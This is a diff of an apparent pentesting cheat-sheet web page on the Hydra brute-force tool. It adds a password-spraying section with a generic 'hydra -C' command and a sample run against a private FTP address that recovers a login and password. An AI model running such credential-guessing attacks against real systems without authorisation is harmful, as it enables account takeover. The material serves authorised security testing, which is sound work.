@@ -342,8 +342,17 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">| ^PASS^             : payload indicator    |
 </span></span></span><span class="line"><span class="cl"><span class="go">| Incorrect password : login failure string |
 </span></span></span><span class="line"><span class="cl"><span class="go">+-------------------------------------------+
-</span></span></span></code></pre></div><h3 id="ssh-with-userpassword-wordlist">SSH with user:password wordlist</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">hydra -C &lt;USERS_PASSWORDS_FILE&gt; ssh://&lt;TARGET&gt;
+</span></span></span></code></pre></div><h3 id="password-spraying-with-userpassword-format">Password spraying with user:password format</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">hydra -C &lt;CREDS_FILE&gt; &lt;PROTOCOL&gt;://&lt;TARGET&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">hydra -C creds.txt ftp://172.16.1.1
+</span></span></span><span class="line"><span class="cl"><span class="go">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-28 11:36:09
+</span></span></span><span class="line"><span class="cl"><span class="go">[DATA] max 16 tasks per 1 server, overall 16 tasks, 19 login tries, ~2 tries per task
+</span></span></span><span class="line"><span class="cl"><span class="go">[DATA] attacking ftp://172.16.1.1:21/
+</span></span></span><span class="line"><span class="cl"><span class="go">[21][ftp] host: 172.16.1.1   login: user   password: password
+</span></span></span><span class="line"><span class="cl"><span class="go">1 of 1 target successfully completed, 1 valid password found
+</span></span></span><span class="line"><span class="cl"><span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-28 11:36:46
 </span></span></span></code></pre></div>
 </div></div>
     
